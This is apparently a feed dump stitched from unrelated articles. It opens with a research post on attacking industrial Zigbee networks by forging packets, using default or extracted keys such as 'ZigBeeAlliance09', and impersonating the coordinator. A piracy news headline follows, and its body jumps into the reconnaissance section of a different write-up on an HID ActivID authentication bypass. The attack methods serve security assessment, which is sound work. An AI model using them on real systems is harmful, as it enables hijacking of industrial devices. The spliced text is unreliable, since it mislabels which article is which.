These services appear simple and straightforward to us, but many devices and protocols work together under the hood to deliver them.One of those protocols is Zigbee. Zigbee is a low-power wireless protocol (based on IEEE 802.15.4) used by many smart devices to talk to each other. It’s common in homes, but is also used in industrial environments where hundreds or thousands of sensors may coordinate to support a process.There are many guides online about performing security assessments of Zigbee. Most focus on the Zigbee you see in home setups. They often skip the Zigbee used at industrial sites, what I call ‘non-public’ or ‘industrial’ Zigbee.Zigbee is a wireless communication protocol designed for low-power applications in wireless sensor networks. Based on the IEEE 802.15.4 standard, it was created for short-range and low-power communication. Zigbee supports mesh networking, meaning devices can connect through each other to extend the network range. It operates on the 2.4 GHz frequency band and is widely used in smart homes, industrial automation, energy monitoring, and many other applications.You may be wondering why there’s a need for Zigbee when Wi-Fi is everywhere? The answer depends on the application. In most home setups, Wi-Fi works well for connecting devices. But imagine you have a battery-powered sensor that isn’t connected to your home’s electricity. If it used Wi-Fi, its battery would drain quickly – maybe in just a few days – because Wi-Fi consumes much more power. In contrast, the Zigbee protocol allows for months or even years of uninterrupted work.Now imagine an even more extreme case. You need to place sensors in a radiation zone where humans can’t go. You drop the sensors from a helicopter and they need to operate for months without a battery replacement. In this situation, power consumption becomes the top priority. Wi-Fi wouldn’t work, but Zigbee is built exactly for this kind of scenario.Also, Zigbee has a big advantage if the area is very large, covering thousands of square meters and requiring thousands of sensors: it supports thousands of nodes in a mesh network, while Wi-Fi is usually limited to hundreds at most.There are lots more ins and outs, but these are the main reasons Zigbee is preferred for large-scale, low-power sensor networks.Since both Zigbee and IEEE 802.15.4 define wireless communication, many people confuse the two. The difference between them, to put it simply, concerns the layers they support. IEEE 802.15.4 defines the physical (PHY) and media access control (MAC) layers, which basically determine how devices send and receive data over the air. Zigbee (as well as other protocols like Thread, WirelessHART, 6LoWPAN, and MiWi) builds on IEEE 802.15.4 by adding the network and application layers that define how devices form a network and communicate.Zigbee operates in the 2.4 GHz wireless band, which it shares with Wi-Fi and Bluetooth. The Zigbee band includes 16 channels, each with a 2 MHz bandwidth and a 5 MHz gap between channels.This shared frequency means Zigbee networks can sometimes face interference from Wi-Fi or Bluetooth devices. However, Zigbee’s low power and adaptive channel selection help minimize these conflicts.There are three main types of Zigbee devices, each of which plays a different role in the network.Zigbee coordinator
The coordinator is the brain of the Zigbee network. A Zigbee network is always started by a coordinator and can only contain one coordinator, which has the fixed address 0x0000.
It performs several key tasks:Starts and manages the Zigbee network.Chooses the Zigbee channel.Assigns addresses to other devices.Stores network information.Chooses the PAN ID: a 2-byte identifier (for example, 0x1234) that uniquely identifies the network.Sets the Extended PAN ID: an 8-byte value, often an ASCII name representing the network.The coordinator can have child devices, which can be either Zigbee routers or Zigbee end devices.Zigbee router
The router works just like a router in a traditional network: it forwards data between devices, extends the network range and can also accept child devices, which are usually Zigbee end devices.
Routers are crucial for building large mesh networks because they enable communication between distant nodes by passing data through multiple hops.Zigbee end device
The end device, also referred to as a Zigbee endpoint, is the simplest and most power-efficient type of Zigbee device. It only communicates with its parent, either a coordinator or router, and sleeps most of the time to conserve power. Common examples include sensors, remotes, and buttons.Zigbee end devices do not accept child devices unless they are configured as both a router and an endpoint simultaneously.Each of these device types, also known as Zigbee nodes, has two types of address:Short address: two bytes long, similar to an IP address in a TCP/IP network.Extended address: eight bytes long, similar to a MAC address.Both addresses can be used in the MAC and network layers, unlike in TCP/IP, where the MAC address is used only in Layer 2 and the IP address in Layer 3.Zigbee has many attack surfaces, such as protocol fuzzing and low-level radio attacks. In this post, however, I’ll focus on application-level attacks. Our test setup uses two attack vectors and is intentionally small to make the concepts clear.In our setup, a Zigbee coordinator is connected to a single device that functions as both a Zigbee endpoint and a router. The coordinator also has other interfaces (Ethernet, Bluetooth, Wi-Fi, LTE), while the endpoint has a relay attached that the coordinator can switch on or off over Zigbee. This relay can be triggered by events coming from any interface, for example, a Bluetooth command or an Ethernet message.Our goal will be to take control of the relay and toggle its state (turn it off and on) using only the Zigbee interface. Because the other interfaces (Ethernet, Bluetooth, Wi-Fi, LTE) are out of scope, the attack must work by hijacking Zigbee communication.For the purposes of this research, we will attempt to hijack the communication between the endpoint and the coordinator. The two attack vectors we will test are:Spoofed packet injection: sending forged Zigbee commands made to look like they come from the coordinator to trigger the relay.Coordinator impersonation (rejoin attack): impersonating the legitimate coordinator to trick the endpoint into joining the attacker-controlled coordinator and controlling it directly.In this scenario, we assume the Zigbee network is already up and running and that both the coordinator and endpoint nodes are working normally. The coordinator has additional interfaces, such as Ethernet, and the system uses those interfaces to trigger the relay. For instance, a command comes in over Ethernet and the coordinator sends a Zigbee command to the endpoint to toggle the relay. Our goal is to toggle the relay by injecting simulated legitimate Zigbee packets, using only the Zigbee link.The first step in any radio assessment is to sniff the wireless traffic so we can learn how the devices talk. For Zigbee, a common and simple tool is the nRF52840 USB dongle by Nordic Semiconductor. With the official nRF Sniffer for 802.15.4 firmware, the dongle can run in promiscuous mode to capture all 802.15.4/Zigbee traffic. Those captures can be opened in Wireshark with the appropriate dissector to inspect the frames.How do you find the channel that’s in use?Zigbee runs on one of the 16 channels that we mentioned earlier, so we must set the sniffer to the same channel that the network uses. One practical way to scan the channels is to change the sniffer channel manually in Wireshark and watch for Zigbee traffic. When we see traffic, we know we’ve found the right channel.After selecting the channel, we will be able to see the communication between the endpoint and the coordinator, though it will most likely be encrypted:In the “Info” column, we can see that Wireshark only identifies packets as Data or Command without specifying their exact type, and that’s because the traffic is encrypted.Even when Zigbee payloads are encrypted, the network and MAC headers remain visible. That means we can usually read things like source and destination addresses, PAN ID, short and extended MAC addresses, and frame control fields. The application payload (i.e., the actual command to toggle the relay) is typically encrypted at the Zigbee network/application layer, so we won’t see it in clear text without encryption keys. Nevertheless, we can still learn enough from the headers.Zigbee supports several key types and encryption models. In this post, we’ll keep it simple and look at a case involving only two security-related devices: a Zigbee coordinator and a device that is both an endpoint and a router. That way, we’ll only use a network encryption model, whereas with, say, mesh networks there can be various encryption models in use.The network encryption model is a common concept. The traffic that we sniffed earlier is typically encrypted using the network key. This key is a symmetric AES-128 key shared by all devices in a Zigbee network. It protects network-layer packets (hop-by-hop) such as routing and broadcast packets. Because every router on the path shares the network key, this encryption method is not considered end-to-end.Depending on the specific implementation, Zigbee can use two approaches for application payloads:Network-layer encryption (hop-by-hop): the network key encrypts the Application Support Sublayer (APS) data, the sublayer of the application layer in Zigbee. In this case, each router along the route can decrypt the APS payload. This is not end-to-end encryption, so it is not recommended for transmitting sensitive data.Link key (end-to-end) encryption: a link key, which is also an AES-128 key, is shared between two devices (for example, the coordinator and an endpoint).The link key provides end-to-end protection of the APS payload between the two devices.Because the network key could allow an attacker to read and forge many types of network traffic, it must be random and protected. Exposing the key effectively compromises the entire network.When a new device joins, the coordinator (Trust Center) delivers the network key using a Transport Key command. That transport packet must be protected by a link key so the network key is not exposed in clear text. The link key authenticates the joining device and protects the key delivery.The image below shows the transport packet:There are two common ways link keys are provided:Pre-installed: the device ships with an installation code or link key already set.Key establishment: the device runs a key-establishment protocol.A common historical problem is the global default Trust Center link key, “ZigBeeAlliance09”. It was included in early versions of Zigbee (pre-3.0) to facilitate testing and interoperability. However, many vendors left it enabled on consumer devices, and that has caused major security issues. If an attacker knows this key, they can join devices and read or steal the network key.Newer versions – Zigbee 3.0 and later – introduced installation codes and procedures to derive unique link keys for each device. An installation code is usually a factory-assigned secret (often encoded on the device label) that the Trust Center uses to derive a unique link key for the device in question. This helps avoid the problems caused by a single hard-coded global key.Unfortunately, many manufacturers still ignore these best practices. During real assessments, we often encounter devices that use default or hard-coded keys.How can these keys be obtained?If an endpoint has already joined the network and communicates with the coordinator using the network key, there are two main options for decrypting traffic:Guess or brute-force the network key. This is usually impractical because a properly generated network key is a random AES-128 key.Force the device to rejoin and capture the transport key. If we can make the endpoint leave the network and then rejoin, the coordinator will send the transport key. Capturing that packet can reveal the network key, but the transport key itself is protected by the link key. Therefore, we still need the link key.To obtain the network and link keys, many approaches can be used:The well-known default link key, ZigBeeAlliance09. Many legacy devices still use it.Identify the device manufacturer and search for the default keys used by that vendor. We can find the manufacturer by:
Checking the device MAC/OUI (the first three bytes of the 64-bit extended address often map to a vendor).Physically inspecting the device (label, model, chip markings).Extract the firmware from the coordinator or device if we have physical access and search for hard-coded keys inside the firmware images.Once we have the relevant keys, the decryption process is straightforward:Open the capture in Wireshark.Go to Edit -> Preferences -> Protocols -> Zigbee.Add the network key and any link keys in our possession.Wireshark will then show decrypted APS payloads and higher-level Zigbee packets.After successful decryption, packet types and readable application commands will be visible, such as Link Status or on/off cluster commands:Now that we can read and potentially decrypt traffic, we need hardware and software to inject packets over the Zigbee link between the coordinator and the endpoint. To keep this practical and simple, I opted for cheap, widely available tools that are easy to set up.For the hardware, I used the nRF52840 USB dongle, the same device we used for sniffing. It’s inexpensive, easy to find, and supports IEEE 802.15.4/Zigbee, so it can sniff and transmit.The dongle runs the firmware we can use. A good firmware platform is Zephyr RTOS. Zephyr has an IEEE 802.15.4 radio API that enables the device to receive raw frames, essentially enabling sniffer mode, as well as send raw frames as seen in the snippets below.Using this API and other components, we created a transceiver implementation written in C, compiled it to firmware, and flashed it to the dongle. The firmware can expose a simple runtime interface, such as a USB serial port, which allows us to control the radio from a laptop.At runtime, the dongle listens on the serial port (for example, /dev/ttyACM1). Using a script, we can send it raw bytes, which the firmware will pass to the radio API and transmit to the channel. The following is an example of a tiny Python script to open the serial port:I used the Scapy tool with the 802.15.4/Zigbee extensions to build Zigbee packets. Scapy lets us assemble packets layer-by-layer – MAC → NWK → APS → ZCL – and then convert them to raw bytes to send to the dongle. We will talk about APS and ZCL in more detail later.Here is an example of how we can use Scapy to craft an APS layer packet:from scapy.layers.dot15d4 import Dot15d4, Dot15d4FCS, Dot15d4Data, Dot15d4Cmd, Dot15d4Beacon, Dot15d4CmdAssocResp
from scapy.layers.zigbee import ZigbeeNWK, ZigbeeAppDataPayload, ZigbeeSecurityHeader, ZigBeeBeacon, ZigbeeAppCommandPayloadBefore sending, the packet must be properly encrypted and signed so the endpoint accepts it. That means applying AES-CCM (AES-128 with MIC) using the network key (or the correct link key) and adhering to Zigbee’s rules for packet encryption and MIC calculation. This is how we implemented the encryption and MIC in Python (using a cryptographic library) after building the Scapy packet. We then sent the final bytes to the dongle.This is how we implemented the encryption and MIC:Now that we know how to inject packets, the next question is what to inject. To toggle the relay, we simply need to send the same type of command that the coordinator already sends. The easiest way to find that command is to sniff the traffic and read the application payload. However, when we look at captures in Wireshark, we can see many packets under ZCL marked [Malformed Packet].A “malformed” ZCL packet usually means Wireshark could not fully interpret the packet because the application layer is non-standard or lacks details Wireshark expects. To understand why this happens, let’s look at the Zigbee application layer.Application Support Sublayer (APS): routes messages to the correct profile, endpoint, and cluster, and provides application-level security.Application Framework (AF): contains the application objects that implement device functionality. These objects reside on endpoints (logical addresses 1–240) and expose clusters (sets of attributes and commands).Zigbee Cluster Library (ZCL): defines standard clusters and commands so devices can interoperate.Zigbee Device Object (ZDO): handles device discovery and management (out of scope for this post).To make sense of application traffic, we must introduce three concepts:Profile: a rulebook for how devices should behave for a specific use case. Public (standard) profiles are managed by the Connectivity Standards Alliance (CSA). Vendors can also create private profiles for proprietary features.Cluster: a set of attributes and commands for a particular function. For example, the On/Off cluster contains On and Off commands and an OnOff attribute that displays the current state.Endpoint: a logical “port” on the device where a profile and clusters reside. A device can host multiple endpoints for different functions.Putting all this together, in the standard home automation traffic we see APS pointing to the home automation profile, the On/Off cluster, and a destination endpoint (for example, endpoint 1). In ZCL, the byte 0x00 often means “Off”.In many industrial setups, vendors use private profiles or custom application frameworks. That’s why Wireshark can’t decode the packets; the AF payload is custom, so the dissector doesn’t know the format.So how do we find the right bytes to toggle the switch when the application is private? Our strategy has two phases.
Sniff traffic while the system is driven legitimately. For example, trigger the relay from another interface (Ethernet or Bluetooth) and capture the Zigbee packets used to toggle the relay. If we can decrypt the captures, we can extract the application payload that correlates with the on/off action.With the legitimate payload at hand, we can now turn to creating our own packet. There are two ways to do that. First, we need to replay or duplicate the captured application payload exactly as it is. This works if there are no freshness checks like sequence numbers. Otherwise, we have to reverse-engineer the payload and adjust any counters or fields that prevent replay. For instance, many applications include an application-level counter. If the device ignores packets with a lower application counter, we must locate and increment that counter when we craft our packet.Another important protective measure is the frame counter inside the Zigbee security header (in the network header security fields). The frame counter prevents replay attacks; the receiver expects the frame counter to increase with each new packet, and will reject packets with a lower or repeated counter.So, in the active phase, we must:Sniff the traffic until the coordinator sends a valid packet to the endpoint.Decrypt the packet, extract the counters and increase them by one.Build a packet with the correct APS/AF fields (profile, endpoint, cluster).Include a valid ZCL command or the vendor-specific payload that we identified in the passive phase.Encrypt and sign the packet with the correct network or link key.Make sure both the application counter (if used) and the Zigbee frame counter are modified so the packet is accepted.The whole strategy for this phase will look like this:If all of the above are handled correctly, we will be able to hijack the Zigbee communication and toggle the relay (turn it off and on) using only the Zigbee link.Coordinator impersonation (rejoin attack)The goal of this attack vector is to force the Zigbee endpoint to leave its original coordinator’s network and join our spoofed network so that we can take control of the device. To do this, we must achieve two things:Force the endpoint to leave the original network.Spoof the original coordinator and trick the node into joining our fake coordinator.To better understand how to manipulate endpoint connections, let’s first describe the concept of a beacon frame. Beacon frames are periodic announcements sent by a coordinator and by routers. They advertise the presence of a network and provide join information, such as:PAN ID and Extended PAN IDStack/profile informationDevice capacity (for example, whether the coordinator can accept child devices)When a device wants to join, it sends a beacon request across Zigbee channels and waits for beacon replies from nearby coordinators/routers. Even if the network is not beacon-enabled for regular synchronization, beacon frames are still used during the join/discovery process, so they are mandatory when a node tries to discover networks.Note that beacon frames exist at both the Zigbee and IEEE 802.15.4 levels. The MAC layer carries the basic beacon structure that Zigbee then extends with network-specific fields.Now, we can force the endpoint to leave its network by abusing how Zigbee handles PAN conflicts. If a coordinator sees beacons from another coordinator using the same PAN ID and the same channel, it may trigger a PAN ID conflict resolution. When that happens, the coordinator can instruct its nodes to change PAN ID and rejoin, which causes them to leave and then attempt to join again. That rejoin window gives us an opportunity to advertise a spoofed coordinator and capture the joining node.In the capture shown below, packet 7 is a beacon generated by our spoofed coordinator using the same PAN ID as the real network. As a result, the endpoint with the address 0xe8fa leaves the network (see packets 14–16).After forcing the endpoint to leave its original network by sending a fake beacon, the next step is to make the endpoint choose our spoofed coordinator. At this point, we assume we already have the necessary keys (network and link keys) and understand how the application behaves.To impersonate the original coordinator, our spoofed coordinator must reply to any beacon request the endpoint sends. The beacon response must include the same Extended PAN ID (and other fields) that the endpoint expects. If the endpoint deems our beacon acceptable, it may attempt to join us.I can think of two ways to make the endpoint prefer our coordinator.Jam the real coordinator
Use a device that reduces the real coordinator’s signal at the endpoint so that it appears weaker, forcing the endpoint to prefer our beacon. This requires extra hardware.Exploit undefined or vendor-specific behavior
Zigbee stacks sometimes behave slightly differently across vendors. One useful field in a beacon is the Update ID field. It increments when a coordinator changes network configuration.If two coordinators advertise the same Extended PAN ID but one has a higher Update ID, some stacks will prefer the beacon with the higher Update ID. This is undefined behavior across implementations; it works on some stacks but not on others. In my experience, sometimes it works and sometimes it fails. There are lots of other similar quirks we can try during an assessment.Even if the endpoint chooses our fake coordinator, the connection may be unstable. One main reason for that is the timing. The endpoint expects ACKs for the frames it sends to the coordinator, as well as fast responses regarding connection initiation packets. If our responder is implemented in Python on a laptop that receives packets, builds responses, and forwards them to a dongle, the round trip will be too slow. The endpoint will not receive timely ACKs or packets and will drop the connection.In short, we’re not just faking a few packets; we’re trying to reimplement parts of Zigbee and IEEE 802.15.4 that must run quickly and reliably. This is usually too slow for production stacks when done in high-level, interpreted code.A practical fix is to run a real Zigbee coordinator stack directly on the dongle. For example, the nRF52840 dongle can act as a coordinator if flashed with the right Nordic SDK firmware (see Nordic’s network coordinator sample). That provides the correct timing and ACK behavior needed for a stable connection.However, that simple solution has one significant disadvantage. In industrial deployments we often run into incompatibilities. In my tests I compared beacons from the real coordinator and the Nordic coordinator firmware. Notable differences were visible in stack profile headers:The stack profile identifies the network profile type. Common values include 0x00, which is a network-specific (private) profile, and 0x02, which is a Zigbee Pro (public) profile.If the endpoint expects a network-specific profile (i.e., it uses a private vendor profile) and we provide Zigbee Pro, the endpoint will refuse to join. Devices that only understand private profiles will not join public-profile networks, and vice versa. In my case, I could not change the Nordic firmware to match the proprietary stack profile, so the endpoint refused to join.Because of this discrepancy, the “flash a coordinator firmware on the dongle” fix was ineffective in that environment. This is why the standard off-the-shelf tools and firmware often fail in industrial cases, forcing us to continue working with and optimizing our custom setup instead.In our previous test setup we used a sniffer in promiscuous mode, which receives every frame on the air regardless of destination. Real Zigbee (IEEE 802.15.4) nodes do not work like that. At the MAC/802.15.4 layer, a node filters frames by PAN ID and destination address. A frame is only passed to upper layers if the PAN ID matches and the destination address is the node’s address or a broadcast address.We can mimic that real behavior on the dongle by running Zephyr RTOS and making the dongle act as a basic 802.15.4 coordinator. In that role, we set a PAN ID and short network address on the dongle so that the radio only accepts frames that match those criteria. This is important because it allows the dongle to handle auto-ACKs and MAC-level timing: the dongle will immediately send ACKs at the MAC level.With the dongle doing MAC-level work (sending ACKs and PAN filtering), we can implement the Zigbee logic in Python. Scapy helps a lot with packet construction: we can create our own beacons with the headers matching those of the original coordinator, which solves the incompatibility problem. However, we must still implement the higher-level Zigbee state machine in our code, including connection initiation, association, network key handling, APS/AF behavior, and application payload handling. That’s the hardest part.There is one timing problem that we cannot solve in Python: the very first steps of initiating a connection require immediate packet responses. To handle this issue, we implemented the time-critical parts in C on the dongle firmware. For example, we can statically generate the packets for connection initiation in Python and hard-code them in the firmware. Then, using “if” statements, we can determine how to respond to each packet from the endpoint.So, we let the dongle (C/Zephyr) handle MAC-level ACKs and the initial association handshake, but let Python build higher-level packets and instruct the dongle what to send next when dealing with the application level. This hybrid model reduces latency and maintains a stable connection. The final architecture looks like this:Here’s a quick recap of how joining works: a Zigbee endpoint broadcasts beacon requests across channels, waits for beacon responses, chooses a coordinator, and sends an association request, followed by a data request to identify its short address. The coordinator then sends a transport key packet containing the network key. If the endpoint has the correct link key, it can decrypt the transport key packet and obtain the network key, meaning it has now been authenticated. From that point on, network traffic is encrypted with the network key. The entire process looks like this:The sticking point is the transport key packet. This packet is protected using the link key, a per-device key shared between the coordinator (Trust Center) and the joining endpoint. Before the link key can be used for encryption, it often needs to be processed (hashed/derived) according to Zigbee’s key derivation rules. Since there is no trivial Python implementation that implements this hashing algorithm, we may need to implement the algorithm ourselves.Now that we’ve managed to obtain the hashed link key and deliver it to the endpoint, we can successfully mimic a coordinator.If we follow the steps above, we can get the endpoint to join our spoofed coordinator. Once the endpoint joins, it will often remain associated with our coordinator, even after we power it down (until another event causes it to re-evaluate its connection). From that point on, we can interact with the device at the application layer using Python. Getting access as a coordinator allowed us to switch the relay on and off as intended, but also provided much more functionality and control over the node.In conclusion, this study demonstrates why private vendor profiles in industrial environments complicate assessments: common tools and frameworks often fail, necessitating the development of custom tools and firmware. We tested a simple two-node scenario, but with multiple nodes the attack surface changes drastically and new attack vectors emerge (for example, attacks against routing protocols).As we saw, a misconfigured Zigbee setup can lead to a complete network compromise. To improve Zigbee security, use the latest specification’s security features, such as using installation codes to derive unique link keys for each device. Also, avoid using hard-coded or default keys. Finally, it is not recommended to use the network key encryption model. Add another layer of security in addition to the network level protection by using end-to-end encryption at the application level.]]></content:encoded></item><item><title>MKVCinemas streaming piracy service with 142M visits shuts down</title><link>https://www.bleepingcomputer.com/news/security/mkvcinemas-streaming-piracy-service-with-142m-visits-shuts-down/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 12 Dec 2025 07:14:31 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[An anti-piracy coalition has dismantled one of India's most popular streaming piracy services, which has provided free access to movies and TV shows to millions over the past two years.

In September 2025, we were asked by one of our clients to focus on a specific product: ActivID Appliance by HID. According to the vendor, this product is used worldwide to secure access to critical infrastructure and data. It supports a wide range of authentication methods including push authentication, OTP, PKI credentials, and static credentials. In this article we will walk you through the methodology we used to discover HID-PSA-2025-002, an authentication bypass in the SOAP API that can lead to administrative access on the application.

## Foreword

This article is intentionally detailed to showcase as many methodological aspects as possible regarding white-box code analysis. If only the part explaining the vulnerability is of interest to you, refer to the HID-PSA-2025-002 security advisory or jump directly to the section Investigating the suspicious behavior.

## Identifying the product

Our first goal was to identify the exact version of the product as multiple versions were available on the download page of HID. The single information that our client had given was the URL of the application. From there, the only version artifact that we noticed was the following identifier inside the HTML footer license agreement of our client’s instance:

This identifier, `v080620`, **could only be found in the** **8.5** **version** of their EULA in PDF format, available for download on their website:

Thus, following the installation guide, we obtained a proper VMware virtualized instance of the appliance on its version 8.5, **giving us full root access on the machine**.

## Discovering the attack surface

This part can seem quite boring at first, but getting a proper understanding of the exposed routes and services is a key step to a proper whitebox review. In this case, we believe that the meticulous analysis of each service contributed greatly to the discovery of the vulnerability.

Our research focuses on the remote surface, so a first classic `nmap` scan is welcomed:

```
$ nmap -p- -sV hid --openPORT STATE SERVICE VERSION 40/tcp open ssh OpenSSH 7.4 (protocol 2.0) 443/tcp open ssl/http nginx 1005/tcp open ssl/http nginx 8443/tcp open ssl/http nginx
```

Once authenticated on the VM, we started enumerating the listening services:

```
$ ss -ntalpState Local Address:Port Process LISTEN 0.0.0.0:3000 users:(("java",pid=3038,fd=58)) LISTEN 127.0.0.1:7800 users:(("java",pid=3038,fd=55)) LISTEN 127.0.0.1:25 users:(("master",pid=1821,fd=13)) LISTEN 0.0.0.0:61626 users:(("java",pid=3446,fd=990)) LISTEN 127.0.0.1:8443 users:(("java",pid=3446,fd=1009)) LISTEN 192.168.116.128:8443 users:(("java",pid=3446,fd=1008)) LISTEN 0.0.0.0:443 users:(("nginx",pid=1435,fd=6)) LISTEN 127.0.0.1:8445 users:(("java",pid=3446,fd=1010)) LISTEN 192.168.116.128:8445 users:(("java",pid=3446,fd=1007)) LISTEN 127.0.0.1:2016 users:(("oraagent.bin",pid=2049,fd=126)) LISTEN 127.0.0.1:50403 users:(("java",pid=3038,fd=57)) LISTEN 0.0.0.0:5093 users:(("lserv",pid=1357,fd=4)) LISTEN 0.0.0.0:40 users:(("sshd",pid=1360,fd=3)) LISTEN 127.0.0.1:9002 users:(("java",pid=3446,fd=694)) LISTEN 192.168.116.128:9002 users:(("java",pid=3446,fd=693)) LISTEN 0.0.0.0:1005 users:(("nginx",pid=1435,fd=8)) LISTEN 0.0.0.0:1006 users:(("nginx",pid=1435,fd=12)) LISTEN 127.0.0.1:56367 users:(("ocssd.bin",pid=2179,fd=137)) LISTEN 127.0.0.1:1007 users:(("miniserv.pl",pid=1858,fd=4)) LISTEN 0.0.0.0:61616 users:(("java",pid=3446,fd=989)) LISTEN 0.0.0.0:1008 users:(("nginx",pid=1435,fd=10)) LISTEN 192.168.116.128:1521 users:(("tnslsnr",pid=2080,fd=16)) LISTEN 127.0.0.1:1521 users:(("tnslsnr",pid=2080,fd=7)) LISTEN 0.0.0.0:1009 users:(("nginx",pid=1435,fd=14)) LISTEN *:50061 users:(("ora_d000_ftress",pid=2513,fd=44))
```

To make it short, the following points are of interest:

- Java processes that are listening on ports 8443, 8445, 1005 and 1006.

- The nginx reverse proxy that could be seen on port 443 in the nmap.


One can notice that these java processes were not displayed as open when using nmap, and this can be explained when listing the firewall rules:

```
$ iptables -nvL[...] Chain IN_public_allow (1 references) pkts bytes target prot opt in out source destination 15719 943K ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:443 ctstate NEW,UNTRACKED 17 1020 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:1005 ctstate NEW,UNTRACKED 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:1006 ctstate NEW,UNTRACKED 0 0 ACCEPT udp -- * * 0.0.0.0/0 0.0.0.0/0 udp dpt:1812 ctstate NEW,UNTRACKED 10 536 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:40 ctstate NEW,UNTRACKED 0 0 ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 ctstate NEW,UNTRACKED mark match 0x64 0 0 ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 ctstate NEW,UNTRACKED mark match 0x65
```

For TCP, only ports 40, 443 (https), 1005 and 1006 are allowed to be reached.

As port 443 is opened over the internet, let's start understanding how the nginx proxy is configured.

### Investigating nginx

Nginx review starts by reading the `/etc/nginx.conf ` file:

```
user nginx; worker_processes 2; http { include /etc/nginx/conf.d/*.conf; }
```

In our case, this main configuration file only includes any other configuration file within the `/etc/nginx/conf.d/` folder:

```
$ ls -l /etc/nginx/conf.d/*.conf-rwx------ 1 root root 2005 Jun 20 2017 /etc/nginx/conf.d/default.conf -rw-r--r-- 1 root root 652 Dec 18 2020 /etc/nginx/conf.d/web_activid.conf
```

The interesting file here is the `web_activid.conf`:

```
upstream weblogic8445 { keepalive 30; server 127.0.0.1:8445; } upstream weblogic8443 { keepalive 30; server 127.0.0.1:8443; } upstream webmin { server 127.0.0.1:1007; } include /etc/nginx/include/TLS1.conf; include /etc/nginx/include/TLS2.conf; include /etc/nginx/include/TLS3.conf; include /etc/nginx/include/MTLS1.conf; include /etc/nginx/include/MTLS2.conf;
```

Two upstream fields are defined as `weblogic8443` and `weblogic8445`, respectively pointing to HTTP services on port 8445 and 8443 of localhost. Upstreams are used to define servers that can then be referred within the whole configuration of the nginx server, we can see those as server variables. After that, some other configuration files are included, that could be defining some TLS services and some Mutual TLS services, as per their naming.

The `/etc/nginx/include/TLS1.conf` is defined as:

```
server { listen 443 ssl ; listen [::]:443 ssl ; ssl_verify_client off; # ... set $upstream weblogic8445; # ... include /etc/nginx/include/app/TLS1/*.conf; }
```

Regarding the other configuration files `TLS2.conf`, `TLS3.conf`, `MTL3.conf` and `MTLS2.conf`, those will not be explored as they refer to services that are not reachable from the internet, or require mutual authentication using a client certificate.

Back to the TLS1 configuration, here, a server listening on port 443 is defined, sets a variable called `$upsteam` to `weblogic8445`, and some server configuration living in `/etc/nginx/include/app/TLS1` are included:

```
$ ls -l /etc/nginx/include/app/TLS1total 0 lrwxrwxrwx 1 root root 48 Sep 2 17:11 AuthenticationPortal.conf -> /etc/nginx/include/app/AuthenticationPortal.conf lrwxrwxrwx 1 root root 39 Sep 2 17:11 HealthCheck.conf -> /etc/nginx/include/app/HealthCheck.conf lrwxrwxrwx 1 root root 45 Sep 2 17:11 ManagementConsole.conf -> /etc/nginx/include/app/ManagementConsole.conf lrwxrwxrwx 1 root root 32 Sep 2 17:11 Root.conf -> /etc/nginx/include/app/Root.conf lrwxrwxrwx 1 root root 35 Sep 2 17:11 SCIMAPI.conf -> /etc/nginx/include/app/SCIMAPI.conf lrwxrwxrwx 1 root root 45 Sep 2 17:11 SelfServicePortal.conf -> /etc/nginx/include/app/SelfServicePortal.conf lrwxrwxrwx 1 root root 35 Sep 2 17:11 SoapAPI.conf -> /etc/nginx/include/app/SoapAPI.conf
```

They are all symlinks to their equivalent file at `/etc/nginx/include/app/`. For instance, the `AuthenticationPortal.conf` file:

```
location /idp/ { proxy_pass https://$upstream; } # OpenID location ~ /idp/[^/]+/authn/ { proxy_pass https://$upstream; include /etc/nginx/include/openiderrorhandling.conf; }
```

Similarly, the `SoapAPI.conf` file:

```
location ^~ /4TRESS/ { proxy_pass https://$upstream; limit_except POST { deny all; } if ($request_uri ~* "(?:wsdl|xsd)$") { return 404; } include /etc/nginx/include/soaperrorhandling.conf; } location ^~ /ac-iasp-backend-jaxws/ { proxy_pass https://$upstream; limit_except POST { deny all; } if ($request_uri ~* "(?:wsdl|xsd)$") { return 404; } include /etc/nginx/include/soaperrorhandling.conf; }
```

One can observe that those configuration files follow the same logic: using a location directive, for instance `/idp/`, they re-route the HTTP request from nginx to a server defined by a nginx variable `$upstream`. Lucky us, such variable has been defined previously, in this case as `weblogic8445`, that points to a HTTP server hosted on port 8445 of localhost!

After extracting all paths and destinations, the following routing can be observed:

### Investigating the Java services

When listing the process, the port 8445 had indeed been listed as a java process.

The full java process information along with its arguments is retrieved as follows:

```

To put it in a nutshell, this java command:

- Launches an instance of the Weblogic web server via the
   `weblogic.Server` class
- Sets some of its properties and features (stdin, stdout, memory usage, ciphersuites, etc.)

- Configures a
   **domain** located at `/opt/hid/weblogic/config/activid_domain`
- Configures some applications specific variables e.g
   `activid.enable.monitoring.servlet`

For Weblogic, a domain is nothing less than a folder containing all the resources needed in order to instantiate one or multiple Java application. In such a folder, according to the documentation there should be a `config.xml` file within a `config` folder:

```
$ ls -lah /opt/hid/weblogic/config/activid_domain/config/config.xml-rw-rw---- 1 ftadmin ftgroup 12K Sep 2 17:15 /opt/hid/weblogic/config/activid_domain/config/config.xml
```

Such XML file contains a listing of every Java applications that have been launched within the domain, along with some other parameters (listening port, logging format, etc.). Those applications can, for instance, be deployed as:

- A WAR (Web Application aRchive): an archive file that contains a single Java web application : static HTML files, business logic within Servlets, JSP files, Java libraries (
   `jar` extension), etc. Such an application is configured by a configuration file, web.xml, located inside the `WEB-INF/web.config` file, once the .war file extracted.
- An EAR (Enterprise Application aRchive): an archive file containing one or multiple WAR files to be deployed, or other Java features such as EJBs (Enterprise Java Beans). Such format is used when needing to share code between applications, or even just group a deployment. Such application is configured by its
   `/WEB-INF/application.xml` configuration file, once the `.ear` file extracted.

In our case, the Weblogic `config.xml` is configured as follows:

